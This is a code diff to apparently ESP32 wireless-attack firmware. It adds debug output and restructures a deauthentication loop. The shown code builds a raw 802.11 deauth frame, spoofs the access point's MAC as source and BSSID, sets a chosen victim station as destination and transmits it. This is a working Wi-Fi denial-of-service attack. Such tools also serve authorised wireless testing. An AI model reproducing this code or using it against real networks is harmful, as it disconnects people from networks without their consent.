@@ -10,6 +10,8 @@
 #include <freertos/FreeRTOS.h>
 #include <freertos/task.h>
 
+#define DEBUG
+
 // ========== DEAUTH PACKET ========== //
 uint8_t deauth_pkt[26] = {
     /*  0 - 1  */ 0xC0, 0x00,                         // Type, subtype: c0 => deauth, a0 => disassociate
@@ -64,6 +66,13 @@ void deauthLoop(void *pvParameter) {
                 /* Use gravity_selected_sta as targetSTA */
                 targetSTA = gravity_selected_stas;
                 targetCount = gravity_sel_sta_count;
+                #ifdef DEBUG
+                    printf("DEAUTH STA mode. targetCount %d", targetCount);
+                    for (int z=0; z<targetCount; ++z) {
+                        printf(" targetSTA[%d] %02x:%02x:%02x:%02x:%02x:%02x",z,targetSTA[z]->mac[0],targetSTA[z]->mac[1],targetSTA[z]->mac[2],targetSTA[z]->mac[3],targetSTA[z]->mac[4],targetSTA[z]->mac[5]);
+                    }
+                    printf("\n");
+                #endif
                 break;
             default:
                 /* NOOP */
@@ -95,22 +104,26 @@ void deauthLoop(void *pvParameter) {
                         printf(" AP MAC %02x:%02x:%02x:%02x:%02x:%02x\n",targetSTA[i]->apMac[0],targetSTA[i]->apMac[1],targetSTA[i]->apMac[2],targetSTA[i]->apMac[3],targetSTA[i]->apMac[4],targetSTA[i]->apMac[5]);
                     #endif
 
-                                /* Set frame and device MAC */
-                                memcpy(&deauth_pkt[DEAUTH_SRC_OFFSET], targetSTA[i]->apMac, 6);
-                                memcpy(&deauth_pkt[DEAUTH_BSSID_OFFSET], targetSTA[i]->apMac, 6);
-                                //ESP_LOGI(DEAUTH_TAG, "Setting MAC: %02x:%02x:%02x:%02x:%02x:%02x",targetSTA[i].apMac[0],targetSTA[i].apMac[1],targetSTA[i].apMac[2],targetSTA[i].apMac[3],targetSTA[i].apMac[4],targetSTA[i].apMac[5]);
-                                if (esp_wifi_set_mac(WIFI_IF_AP, targetSTA[i]->apMac) != ESP_OK) {
-                                    ESP_LOGW(DEAUTH_TAG, "Setting MAC to %02x:%02x:%02x:%02x:%02x:%02x failed, oh well",targetSTA[i]->apMac[0],targetSTA[i]->apMac[1],targetSTA[i]->apMac[2],targetSTA[i]->apMac[3],targetSTA[i]->apMac[4],targetSTA[i]->apMac[5]);
-                                }
-                            }
+                        /* Set frame and device MAC */
+                        memcpy(&deauth_pkt[DEAUTH_SRC_OFFSET], targetSTA[i]->apMac, 6);
+                        memcpy(&deauth_pkt[DEAUTH_BSSID_OFFSET], targetSTA[i]->apMac, 6);
+                        //ESP_LOGI(DEAUTH_TAG, "Setting MAC: %02x:%02x:%02x:%02x:%02x:%02x",targetSTA[i].apMac[0],targetSTA[i].apMac[1],targetSTA[i].apMac[2],targetSTA[i].apMac[3],targetSTA[i].apMac[4],targetSTA[i].apMac[5]);
+                        if (esp_wifi_set_mac(WIFI_IF_AP, targetSTA[i]->apMac) != ESP_OK) {
+                            ESP_LOGW(DEAUTH_TAG, "Setting MAC to %02x:%02x:%02x:%02x:%02x:%02x failed, oh well",targetSTA[i]->apMac[0],targetSTA[i]->apMac[1],targetSTA[i]->apMac[2],targetSTA[i]->apMac[3],targetSTA[i]->apMac[4],targetSTA[i]->apMac[5]);
+                        }
+                    } else {
+                        printf("No AP info, not changing SRC\n");
+                    }
                     break;
                 default:
                         ESP_LOGE(DEAUTH_TAG, "Invalid MAC action %d", deauthMAC);
                     continue;
             }
             /* Set destination */
+            #ifdef DEBUG
+                printf("Destination %s\n",targetSTA[i]->strMac);
+            #endif
             memcpy(&deauth_pkt[DEAUTH_DEST_OFFSET], targetSTA[i]->mac, 6);
-            // TODO: Set device channel
 
             // Transmit
             esp_wifi_80211_tx(WIFI_IF_AP, deauth_pkt, sizeof(deauth_pkt), false);
